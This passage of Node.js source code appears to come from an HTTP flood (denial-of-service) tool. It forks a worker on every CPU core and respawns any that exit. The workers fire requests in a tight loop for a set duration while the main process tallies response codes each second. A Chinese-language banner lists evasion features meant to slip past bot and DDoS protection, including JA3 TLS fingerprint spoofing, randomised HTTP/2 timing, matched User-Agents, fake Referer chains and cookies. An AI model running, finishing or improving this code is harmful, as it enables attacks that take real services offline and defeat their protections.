    Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }));
    console.log(`Main start :)`);
    console.log(`\n=== 高级反检测系统已启用 ===`);
    console.log(`✓ JA3指纹模拟 - 真实浏览器TLS特征`);
    console.log(`✓ HTTP/2帧时序随机化`);
    console.log(`✓ 请求间隔智能调节`);
    console.log(`✓ 真实User-Agent与TLS指纹匹配`);
    console.log(`✓ 浏览器缓存行为模拟`);
    console.log(`✓ 真实Referer链生成`);
    console.log(`✓ 隐私头部模拟 (DNT/GPC)`);
    console.log(`✓ 会话恢复和连接复用`);
    console.log(`✓ 真实Cookie和追踪头部`);

    // 显示示例JA3配置
    const sampleJA3 = generateJA3Config();
    console.log(`\n当前JA3配置: ${sampleJA3.browser} v${sampleJA3.version}`);
    console.log(`JA3指纹: ${sampleJA3.ja3String}`);
    console.log(`密码套件: ${sampleJA3.ciphers.split(':').length} 个`);
    console.log(`椭圆曲线: ${sampleJA3.curves}`);
    console.log(`================================\n`);

    cluster.on('exit', (worker) => {
        cluster.fork({ core: worker.id % os.cpus().length });
    });

    cluster.on('message', (worker, message) => {
        workers[worker.id] = [worker, message];
    });

    setInterval(() => {
        let statuses = {};
        for (let w in workers) {
            if (workers[w][0].state == 'online') {
                for (let st of workers[w][1]) {
                    for (let code in st) {
                        if (statuses[code] == null)
                            statuses[code] = 0;

                        statuses[code] += st[code];
                    }
                }
            }
        }

        console.clear();
        console.log(statuses);
    }, 1000);

    setTimeout(() => process.exit(1), time * 1000);
} else {
    setInterval(() => {
        startRequest();
    });

    setInterval(() => {
        if (statusesQ.length >= 4)
            statusesQ.shift();

        statusesQ.push(statuses);
        statuses = {};
        process.send(statusesQ);
    }, 950);

    setTimeout(() => process.exit(1), time * 1000);
